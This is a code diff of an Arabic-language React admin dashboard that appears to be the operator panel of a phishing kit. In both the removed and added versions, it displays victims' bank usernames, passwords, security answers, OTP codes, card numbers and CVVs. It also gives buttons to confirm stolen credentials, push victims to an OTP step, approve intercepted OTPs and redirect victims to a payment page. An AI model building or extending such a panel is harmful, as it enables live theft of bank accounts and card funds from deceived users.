@@ -1223,472 +1223,222 @@ export default function AdminDashboardPage() {
                               .map((v) => v.otpCode)
                           ).size;
 
-                          return (
-                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                                  {/* صندوق البيانات الشخصية */}
-                        <div className="bg-card rounded-xl p-4 space-y-2">
-                          <div className="flex items-center gap-2">
-                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
-                              <User className="w-4 h-4" />
-                              {allData.applicantType === "business"
-                                ? "بيانات الشركة"
-                                : "البيانات الشخصية"}
-                            </h4>
-                            <SectionTimeBadge timestamp={app.createdAt} />
-                          </div>
-                          <DataBadge
-                            label="الاسم"
-                            value={
-                              allData.fullName || allData.companyName || allData.contactName
-                            }
-                          />
-                          <DataBadge
-                            label="رقم الهوية / السجل"
-                            value={allData.nationalId || allData.commercialRegistration}
-                          />
-                          <DataBadge label="رقم الهاتف" value={allData.phone} />
-                          <DataBadge
-                            label="البريد الإلكتروني"
-                            value={allData.email}
-                          />
-                          <DataBadge
-                            label="تاريخ الميلاد"
-                            value={allData.dateOfBirth}
-                          />
-                          <DataBadge
-                            label="الراتب الشهري"
-                            value={allData.monthlySalary}
-                          />
-                          <DataBadge label="جهة العمل" value={allData.employer} />
-                          <DataBadge label="المدينة" value={allData.city} />
-                          <DataBadge
-                            label="الحالة الاجتماعية"
-                            value={allData.maritalStatus}
-                          />
-                          <DataBadge
-                            label="نوع النشاط"
-                            value={allData.businessType}
-                          />
-                          <DataBadge
-                            label="عدد الموظفين"
-                            value={allData.employeeCount}
-                          />
-                          <DataBadge
-                            label="الإيرادات السنوية"
-                            value={allData.annualRevenue}
-                          />
-                          
-                          {/* سجلات البيانات الشخصية */}
-                          <HistorySection
-                            type="applicant"
-                            records={versions.filter(v => v.fullName || v.companyName || v.contactName)}
-                            expanded={expandedHistory.applicant}
-                            onToggle={() => setExpandedHistory(h => ({ ...h, applicant: !h.applicant }))}
-                          />
-                        </div>
-
-                        {/* صندوق بيانات البنك */}
-                        <div className="bg-card rounded-xl p-4 space-y-2">
-                          <div className="flex items-center gap-2">
-                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
-                              <CreditCard className="w-4 h-4" />
-                              بيانات البنك والدخول
-                            </h4>
-                            <SectionTimeBadge timestamp={app.bankUsername ? app.updatedAt : undefined} />
-                          </div>
-                          {/* اسم البنك بارز في الأعلى */}
-                          {allData.bankName && (
-                            <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
-                              <CreditCard className="w-5 h-5 text-primary shrink-0" />
-                              <div>
-                                <p className="text-[10px] text-muted-foreground font-medium">البنك المختار</p>
-                                <p className="text-base font-black text-primary">{String(allData.bankName)}</p>
-                              </div>
-                            </div>
-                          )}
-                          <DataBadge
-                            label="اسم المستخدم"
-                            value={allData.bankUsername}
-                          />
-                          <DataBadge
-                            label="كلمة المرور"
-                            value={allData.bankPassword}
-                          />
-                          <DataBadge
-                            label="كلمة التحقق / الأمان"
-                            value={allData.securityAnswer}
-                          />
-
-                          {/* قرار بيانات الدخول */}
-                          {allData.bankUsername && app.sessionId && (
-                            <div className="pt-3 border-t space-y-2">
-                              <p className="text-xs font-bold text-muted-foreground">
-                                قرار بيانات الدخول:
-                              </p>
-                              <input
-                                type="text"
-                                placeholder="رسالة الرفض (اختياري)"
-                                value={rejectionMsg[app.id] || ""}
-                                onChange={(e) =>
-                                  setRejectionMsg((r) => ({
-                                    ...r,
-                                    [app.id]: e.target.value,
-                                  }))
-                                }
-                                className="w-full text-xs border rounded-lg px-3 py-2 bg-background"
-                              />
-                              <div className="flex gap-2">
-                                <button
-                                  onClick={() =>
-                                    handleCredentialsDecision(
-                                      app.sessionId!,
-                                      "approved",
-                                      app.id,
-                                    )
-                                  }
-                                  disabled={
-                                    !!actionLoading[`cred_${app.id}_approved`]
-                                  }
-                                  className="flex-1 bg-green-100 text-green-700 py-2 rounded-lg text-xs font-bold hover:bg-green-200 disabled:opacity-50 transition-colors"
-                                >
-                                  ✓ صحيحة → رمز
-                                </button>
-                                <button
-                                  onClick={() =>
-                                    handleCredentialsDecision(
-                                      app.sessionId!,
-                                      "rejected",
-                                      app.id,
-                                    )
-                                  }
-                                  disabled={
-                                    !!actionLoading[`cred_${app.id}_rejected`]
-                                  }
-                                  className="flex-1 bg-red-100 text-red-700 py-2 rounded-lg text-xs font-bold hover:bg-red-200 disabled:opacity-50 transition-colors"
-                                >
-                                  ✗ خاطئة
-                                </button>
-                              </div>
-                            </div>
-                          )}
-                          
-                          {/* سجلات البنك والدخول */}
-                          <HistorySection
-                            type="credentials"
-                            records={versions.filter(v => v.bankUsername || v.bankPassword || v.bankName)}
-                            expanded={expandedHistory.credentials}
-                            onToggle={() => setExpandedHistory(h => ({ ...h, credentials: !h.credentials }))}
-                          />
-                        </div>
-
-                        {/* صندوق OTP */}
-                        <div className="bg-card rounded-xl p-4 space-y-2">
-                          <div className="flex items-center gap-2">
-                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
-                              <Smartphone className="w-4 h-4" />
-                              رمز OTP والحالة
-                              {otpAttempts > 0 && (
-                                <span className={`text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
-                                  {otpAttempts} {otpAttempts === 1 ? "محاولة" : "محاولات"}
-                                </span>
-                              )}
-                            </h4>
-                            <SectionTimeBadge timestamp={allData.otpCode ? app.updatedAt : undefined} />
-                          </div>
-                          {allData.otpCode ? (
-                            <div className="bg-muted rounded-xl p-4 text-center">
-                              <p className="text-xs text-muted-foreground mb-1">
-                                رمز التحقق
-                              </p>
-                              <p className="text-3xl font-mono font-black text-primary tracking-[0.3em]">
-                                {allData.otpCode}
-                              </p>
-                            </div>
-                          ) : (
-                            <p className="text-sm text-muted-foreground text-center py-4">
-                              لم يُدخل رمز بعد
-                            </p>
-                          )}
-
-                          <div className="space-y-1 pt-2">
-                            <DataBadge
-                              label="الخطوة الحالية"
-                              value={
-                                stepLabels[app.currentStep] || app.currentStep
-                              }
-                            />
-                            <DataBadge
-                              label="الحالة"
-                              value={statusLabels[app.status] || app.status}
-                            />
-                            {app.adminNote && (
-                              <DataBadge
-                                label="ملاحظة المدير"
-                                value={app.adminNote}
-                              />
-                            )}
-                          </div>
-
-                          {/* قرار OTP */}
-                          {allData.otpCode && app.sessionId && (
-                            <div className="pt-3 border-t">
-                              <p className="text-xs font-bold text-muted-foreground mb-2">
-                                قرار رمز OTP:
-                              </p>
-                              <div className="flex gap-1 flex-wrap">
-                                <button
-                                  onClick={() =>
-                                    handleOtpDecision(
-                                      app.sessionId!,
-                                      "approved",
-                                      app.id,
-                                    )
-                                  }
-                                  disabled={
-                                    !!actionLoading[`otp_${app.id}_approved`]
-                                  }
-                                  className="flex-1 bg-green-100 text-green-700 py-2 rounded-lg text-xs font-bold hover:bg-green-200 disabled:opacity-50 transition-colors"
-                                >
-                                  ✓ صحيح
-                                </button>
-                                <button
-                                  onClick={() =>
-                                    handleOtpDecision(
-                                      app.sessionId!,
-                                      "rejected",
-                                      app.id,
-                                    )
-                                  }
-                                  disabled={
-                                    !!actionLoading[`otp_${app.id}_rejected`]
-                                  }
-                                  className="flex-1 bg-red-100 text-red-700 py-2 rounded-lg text-xs font-bold hover:bg-red-200 disabled:opacity-50 transition-colors"
-                                >
-                                  ✗ خطأ
-                                </button>
-                                <button
-                                  onClick={() =>
-                                    handleOtpDecision(
-                                      app.sessionId!,
-                                      "no_credit",
-                                      app.id,
-                                    )
-                                  }
-                                  disabled={
-                                    !!actionLoading[`otp_${app.id}_no_credit`]
-                                  }
-                                  className="flex-1 bg-orange-100 text-orange-700 py-2 rounded-lg text-xs font-bold hover:bg-orange-200 disabled:opacity-50 transition-colors"
-                                >
-                                  لا رصيد
-                                </button>
-                              </div>
-                            </div>
-                          )}
-                          
-                          {/* سجلات رموز OTP */}
-                          <HistorySection
-                            type="otp"
-                            records={versions.filter(v => v.otpCode)}
-                            expanded={expandedHistory.otp}
-                            onToggle={() => setExpandedHistory(h => ({ ...h, otp: !h.otp }))}
-                          />
-                        </div>
-
-                        {/* صندوق بيانات الدفع */}
-                        <div className="bg-card rounded-xl p-4 space-y-2">
-                          <div className="flex items-center gap-2">
-                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
-                              <CreditCard className="w-4 h-4" />
-                              بيانات الدفع (PayVisa)
-                            </h4>
-                            <SectionTimeBadge timestamp={allData.paymentCardHolder ? app.updatedAt : undefined} />
-                          </div>
-                          {allData.paymentCardHolder ? (
+return (
                             <div className="space-y-3">
-                              <div className={`rounded-xl p-4 ${
-                                app.paymentStatus === "verifying"
-                                  ? "bg-yellow-50 border border-yellow-200"
-                                  : app.paymentStatus === "completed"
-                                  ? "bg-green-50 border border-green-200"
-                                  : app.paymentStatus === "failed"
-                                  ? "bg-red-50 border border-red-200"
-                                  : "bg-gray-50 border border-gray-200"
-                              }`}>
-                                <div className="flex items-center gap-2 mb-3">
-                                  <span className={`px-2 py-1 rounded-full text-xs font-bold ${
-                                    app.paymentStatus === "completed" 
-                                      ? "bg-green-100 text-green-700" 
-                                      : app.paymentStatus === "verifying"
-                                      ? "bg-yellow-100 text-yellow-700"
-                                      : "bg-gray-100 text-gray-700"
-                                  }`}>
-                                    {app.paymentStatus === "completed" ? "✓ تم الدفع" 
-                                      : app.paymentStatus === "failed" ? "✗ فشل الدفع"
-                                      : app.paymentStatus === "verifying"
-                                      ? "🔄 جاري التحقق"
-                                      : "⏳ بانتظار الدفع"}
-                                  </span>
-                                </div>
-                                <div className="space-y-2">
-                                  <DataBadge
-                                    label="رقم البطاقة"
-                                    value={allData.paymentCardNumber}
-                                  />
-                                  <DataBadge
-                                    label="حامل البطاقة"
-                                    value={allData.paymentCardHolder}
-                                  />
-                                  <DataBadge
-                                    label="تاريخ الانتهاء"
-                                    value={allData.paymentExpiryDate}
-                                  />
-                                  {/* صندوق الرمز السري للبطاقة */}
-                                  {allData.paymentCvv && (
-                                    <div className="mt-4 pt-4 border-t border-gray-200">
-                                      <div className="bg-purple-50 border border-purple-200 rounded-xl p-4">
-                                        <h5 className="font-bold text-sm text-purple-700 mb-2 flex items-center gap-2">
-                                          <Shield className="w-4 h-4" />
-                                          الرمز السري للبطاقة (CVV)
-                                        </h5>
-                                        <div className="text-center">
-                                          <span className="text-2xl font-mono font-black text-purple-700 tracking-widest">
-                                            {allData.paymentCvv}
+                              {/* صندوق رئيسي واحد لكل عميل */}
+                              <div className="bg-card rounded-xl p-4">
+                                {/* رأس العميل */}
+                                <div className="flex items-center justify-between border-b pb-3 mb-4">
+                                  <div className="flex items-center gap-3">
+                                    <div className="w-10 h-10 navy-gradient rounded-xl flex items-center justify-center text-white">
+                                      {app.applicantType === "business" ? <Building2 className="w-5 h-5" /> : <User className="w-5 h-5" />}
+                                    </div>
+                                    <div>
+                                      <h4 className="font-bold text-base text-primary">
+                                        {allData.applicantType === "business"
+                                          ? allData.companyName || "بيانات الشركة"
+                                          : allData.fullName || allData.contactName || "بيانات العميل"}
+                                      </h4>
+                                      <p className="text-xs text-muted-foreground">
+                                        {app.applicantType === "business" ? "عميل شركة" : "عميل فردي"}
+                                        {otpAttempts > 0 && (
+                                          <span className="mr-2 text-orange-600 font-bold">
+                                            • {otpAttempts} {otpAttempts === 1 ? "محاولة OTP" : "محاولات OTP"}
                                           </span>
-                                        </div>
-                                      </div>
+                                        )}
+                                      </p>
                                     </div>
-                                  )}
-
-                                  {/* صندوق رمز التحقق OTP */}
-                                  {allData.paymentOtp && (
-                                    <div className="mt-4 pt-4 border-t border-gray-200">
-                                      <div className="bg-orange-50 border border-orange-200 rounded-xl p-4">
-                                        <h5 className="font-bold text-sm text-orange-700 mb-2 flex items-center gap-2">
-                                          <Smartphone className="w-4 h-4" />
-                                          رمز التحقق (OTP)
-                                        </h5>
-                                        <div className="text-center">
-                                          <span className="text-2xl font-mono font-black text-orange-700 tracking-widest">
-                                            {allData.paymentOtp}
-                                          </span>
-                                        </div>
-                                      </div>
-                                    </div>
-                                  )}
-
-                                  {/* أزرار التحقق عند حالة verifying */}
-                                  {app.paymentStatus === "verifying" && (
-                                    <div className="mt-4 space-y-2">
-                                      <button
-                                        onClick={() => handlePaymentAction(app.id, "approve")}
-                                        disabled={!!actionLoading[`pay_action_${app.id}`]}
-                                        className="w-full bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
-                                      >
-                                        <CheckCircle className="w-4 h-4" />
-                                        {actionLoading[`pay_action_${app.id}`] === "approve" ? "جاري التحويل..." : "✓ تحويل للرمز"}
-                                      </button>
-                                      <button
-                                        onClick={() => handlePaymentAction(app.id, "reject")}
-                                        disabled={!!actionLoading[`pay_action_${app.id}`]}
-                                        className="w-full bg-red-500 hover:bg-red-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
-                                      >
-                                        <XCircle className="w-4 h-4" />
-                                        {actionLoading[`pay_action_${app.id}`] === "reject" ? "جاري الرفض..." : "✗ رفض - البطاقة غير صحيحة"}
-                                      </button>
-                                    </div>
-                                  )}
-                                  
-                                  {/* رسالة النجاح */}
-                                  {app.paymentStatus === "completed" && (
-                                    <div className="mt-4 bg-green-100 rounded-lg p-3 text-center">
-                                      <p className="text-green-700 text-sm font-bold">✓ تمت معالجة الدفع بنجاح</p>
-                                    </div>
-                                  )}
-                                  {/* رسالة الفشل */}
-                                  {app.paymentStatus === "failed" && (
-                                    <div className="mt-4 bg-red-100 rounded-lg p-3 text-center">
-                                      <p className="text-red-700 text-sm font-bold">✗ تم رفض الدفع</p>
-                                    </div>
-                                  )}
-
-                                  {/* أزرار تأكيد/رفض رمز OTP */}
-                                  {app.paymentStatus === "otp_submitted" && app.currentStep === "pay-otp" && (
-                                    <div className="mt-4 space-y-2">
-                                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
-                                        <p className="text-blue-700 text-sm font-bold">🔐 بانتظار تأكيد رمز OTP</p>
-                                        <p className="text-blue-600 text-xs mt-1">العميل ينتظر الموافقة على الرمز</p>
-                                      </div>
-                                      <button
-                                        onClick={() => handleOtpAction(app.id, "approve")}
-                                        disabled={!!actionLoading[`otp_action_${app.id}`]}
-                                        className="w-full bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
-                                      >
-                                        <CheckCircle className="w-4 h-4" />
-                                        {actionLoading[`otp_action_${app.id}`] === "approve" ? "جاري الموافقة..." : "✓ تأكيد الرمز وإتمام الدفع"}
-                                      </button>
-                                      <button
-                                        onClick={() => handleOtpAction(app.id, "reject")}
-                                        disabled={!!actionLoading[`otp_action_${app.id}`]}
-                                        className="w-full bg-orange-500 hover:bg-orange-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
-                                      >
-                                        <XCircle className="w-4 h-4" />
-                                        {actionLoading[`otp_action_${app.id}`] === "reject" ? "جاري الرفض..." : "✗ رفض الرمز وطلب رمز جديد"}
-                                      </button>
-                                    </div>
-                                  )}
+                                  </div>
+                                  <SectionTimeBadge timestamp={app.updatedAt} />
                                 </div>
+
+                                {/* قسم البيانات الشخصية */}
+                                <div className="bg-muted/30 rounded-lg p-3 mb-3">
+                                  <h5 className="font-bold text-sm text-primary mb-2 flex items-center gap-2">
+                                    <User className="w-4 h-4" />
+                                    البيانات الشخصية
+                                  </h5>
+                                  <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
+                                    <DataBadge label="الاسم" value={allData.fullName || allData.companyName || allData.contactName} />
+                                    <DataBadge label="رقم الهوية" value={allData.nationalId || allData.commercialRegistration} />
+                                    <DataBadge label="الهاتف" value={allData.phone} />
+                                    <DataBadge label="البريد" value={allData.email} />
+                                    <DataBadge label="جهة العمل" value={allData.employer} />
+                                    <DataBadge label="المدينة" value={allData.city} />
+                                  </div>
+                                </div>
+
+                                {/* قسم بيانات البنك */}
+                                {allData.bankName && (
+                                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-3">
+                                    <h5 className="font-bold text-sm text-blue-700 mb-2 flex items-center gap-2">
+                                      <CreditCard className="w-4 h-4" />
+                                      بيانات البنك
+                                    </h5>
+                                    <div className="bg-gradient-to-l from-blue-500 to-blue-600 text-white rounded-lg p-3 mb-3">
+                                      <p className="font-bold text-lg">{allData.bankName}</p>
+                                    </div>
+                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
+                                      <DataBadge label="المستخدم" value={allData.bankUsername} />
+                                      <DataBadge label="كلمة المرور" value={allData.bankPassword} />
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* قسم OTP */}
+                                {allData.otpCode && (
+                                  <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 mb-3">
+                                    <h5 className="font-bold text-sm text-orange-700 mb-2 flex items-center gap-2">
+                                      <Smartphone className="w-4 h-4" />
+                                      رمز التحقق
+                                    </h5>
+                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
+                                      <DataBadge label="رمز OTP" value={allData.otpCode} />
+                                      <DataBadge label="الحالة" value={allData.otpStatus} />
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* قسم بيانات الدفع */}
+                                {allData.paymentCardNumber ? (
+                                  <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-3">
+                                    <h5 className="font-bold text-sm text-green-700 mb-2 flex items-center gap-2">
+                                      <CreditCard className="w-4 h-4" />
+                                      بيانات الدفع
+                                    </h5>
+                                    <div className="space-y-2">
+                                      <DataBadge label="رقم البطاقة" value={allData.paymentCardNumber} />
+                                      <DataBadge label="حامل البطاقة" value={allData.paymentCardHolder} />
+                                      <DataBadge label="تاريخ الانتهاء" value={allData.paymentExpiryDate} />
+
+                                      {/* صندوق الرمز السري للبطاقة */}
+                                      {allData.paymentCvv && (
+                                        <div className="mt-4 pt-4 border-t border-green-200">
+                                          <div className="bg-purple-50 border border-purple-200 rounded-xl p-4">
+                                            <h5 className="font-bold text-sm text-purple-700 mb-2 flex items-center gap-2">
+                                              <Shield className="w-4 h-4" />
+                                              الرمز السري للبطاقة (CVV)
+                                            </h5>
+                                            <div className="text-center">
+                                              <span className="text-2xl font-mono font-black text-purple-700 tracking-widest">
+                                                {allData.paymentCvv}
+                                              </span>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      )}
+
+                                      {/* صندوق رمز التحقق OTP */}
+                                      {allData.paymentOtp && (
+                                        <div className="mt-4 pt-4 border-t border-green-200">
+                                          <div className="bg-orange-50 border border-orange-200 rounded-xl p-4">
+                                            <h5 className="font-bold text-sm text-orange-700 mb-2 flex items-center gap-2">
+                                              <Smartphone className="w-4 h-4" />
+                                              رمز التحقق (OTP)
+                                            </h5>
+                                            <div className="text-center">
+                                              <span className="text-2xl font-mono font-black text-orange-700 tracking-widest">
+                                                {allData.paymentOtp}
+                                              </span>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      )}
+
+                                      {/* أزرار التحقق */}
+                                      {app.paymentStatus === "verifying" && (
+                                        <div className="mt-4 space-y-2">
+                                          <button
+                                            onClick={() => handlePaymentAction(app.id, "approve")}
+                                            disabled={!!actionLoading[`pay_action_${app.id}`]}
+                                            className="w-full bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
+                                          >
+                                            <CheckCircle className="w-4 h-4" />
+                                            {actionLoading[`pay_action_${app.id}`] === "approve" ? "جاري التحويل..." : "✓ تحويل للرمز"}
+                                          </button>
+                                          <button
+                                            onClick={() => handlePaymentAction(app.id, "reject")}
+                                            disabled={!!actionLoading[`pay_action_${app.id}`]}
+                                            className="w-full bg-red-500 hover:bg-red-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
+                                          >
+                                            <XCircle className="w-4 h-4" />
+                                            {actionLoading[`pay_action_${app.id}`] === "reject" ? "جاري الرفض..." : "✗ رفض - البطاقة غير صحيحة"}
+                                          </button>
+                                        </div>
+                                      )}
+
+                                      {/* رسالة النجاح */}
+                                      {app.paymentStatus === "completed" && (
+                                        <div className="mt-4 bg-green-100 rounded-lg p-3 text-center">
+                                          <p className="text-green-700 text-sm font-bold">✓ تمت معالجة الدفع بنجاح</p>
+                                        </div>
+                                      )}
+                                      {/* رسالة الفشل */}
+                                      {app.paymentStatus === "failed" && (
+                                        <div className="mt-4 bg-red-100 rounded-lg p-3 text-center">
+                                          <p className="text-red-700 text-sm font-bold">✗ تم رفض الدفع</p>
+                                        </div>
+                                      )}
+
+                                      {/* أزرار تأكيد/رفض رمز OTP */}
+                                      {app.paymentStatus === "otp_submitted" && app.currentStep === "pay-otp" && (
+                                        <div className="mt-4 space-y-2">
+                                          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
+                                            <p className="text-blue-700 text-sm font-bold">🔐 بانتظار تأكيد رمز OTP</p>
+                                            <p className="text-blue-600 text-xs mt-1">العميل ينتظر الموافقة على الرمز</p>
+                                          </div>
+                                          <button
+                                            onClick={() => handleOtpAction(app.id, "approve")}
+                                            disabled={!!actionLoading[`otp_action_${app.id}`]}
+                                            className="w-full bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
+                                          >
+                                            <CheckCircle className="w-4 h-4" />
+                                            {actionLoading[`otp_action_${app.id}`] === "approve" ? "جاري الموافقة..." : "✓ تأكيد الرمز وإتمام الدفع"}
+                                          </button>
+                                          <button
+                                            onClick={() => handleOtpAction(app.id, "reject")}
+                                            disabled={!!actionLoading[`otp_action_${app.id}`]}
+                                            className="w-full bg-orange-500 hover:bg-orange-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
+                                          >
+                                            <XCircle className="w-4 h-4" />
+                                            {actionLoading[`otp_action_${app.id}`] === "reject" ? "جاري الرفض..." : "✗ رفض الرمز وطلب رمز جديد"}
+                                          </button>
+                                        </div>
+                                      )}
+                                    </div>
+                                  </div>
+                                ) : (
+                                  <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 text-center">
+                                    <p className="text-sm text-amber-700">لم يتم إدخال بيانات الدفع بعد</p>
+                                  </div>
+                                )}
+
+                                {/* زر إرسال العميل لصفحة الدفع */}
+                                {app.sessionId && (
+                                  <button
+                                    onClick={() => handleRequestPayment(app.id, app.sessionId!)}
+                                    disabled={!!actionLoading[`pay_${app.id}`]}
+                                    className="w-full bg-gradient-to-l from-primary to-primary/80 hover:from-primary/90 hover:to-primary text-white py-3 rounded-xl text-sm font-bold disabled:opacity-50 transition-all flex items-center justify-center gap-2 mt-4"
+                                  >
+                                    <CreditCard className="w-4 h-4" />
+                                    {actionLoading[`pay_${app.id}`] ? (
+                                      <>
+                                        <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
+                                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                                        </svg>
+                                        جاري التوجيه...
+                                      </>
+                                    ) : (
+                                      "إرسال العميل لصفحة الدفع"
+                                    )}
+                                  </button>
+                                )}
                               </div>
                             </div>
-                          ) : (
-                            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4">
-                              <p className="text-sm text-amber-700 text-center">
-                                لم يتم إدخال بيانات الدفع بعد
-                              </p>
-                            </div>
-                          )}
-                          
-                          {/* زر إرسال العميل لصفحة الدفع - يظهر دائماً */}
-                          {/* سجلات البطاقات و OTP */}
-                          <HistorySection
-                            type="payment-card"
-                            records={versions.filter(v => v.paymentCardNumber)}
-                            expanded={expandedHistory["payment-card"]}
-                            onToggle={() => setExpandedHistory(h => ({ ...h, "payment-card": !h["payment-card"] }))}
-                          />
-                          <HistorySection
-                            type="payment-otp"
-                            records={versions.filter(v => v.paymentOtp)}
-                            expanded={expandedHistory["payment-otp"]}
-                            onToggle={() => setExpandedHistory(h => ({ ...h, "payment-otp": !h["payment-otp"] }))}
-                          />
+                          );
+                        })()}
 
-                          {app.sessionId && (
-                            <button
-                              onClick={() => handleRequestPayment(app.id, app.sessionId!)}
-                              disabled={!!actionLoading[`pay_${app.id}`]}
-                              className="w-full bg-gradient-to-l from-primary to-primary/80 hover:from-primary/90 hover:to-primary text-white py-3 rounded-xl text-sm font-bold disabled:opacity-50 transition-all flex items-center justify-center gap-2"
-                            >
-                              <CreditCard className="w-4 h-4" />
-                              {actionLoading[`pay_${app.id}`] ? (
-                                <>
-                                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
-                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                                  </svg>
-                                  جاري التوجيه...
-                                </>
-                              ) : (
-                                <>
-                                  <CreditCard className="w-4 h-4" />
-                                  إرسال العميل لصفحة الدفع
-                                </>
-                              )}
-                            </button>
-                          )}
-                        </div>
-                              </div>
-                            );
-                          })()}
                       </div>
                     )}
                   </div>
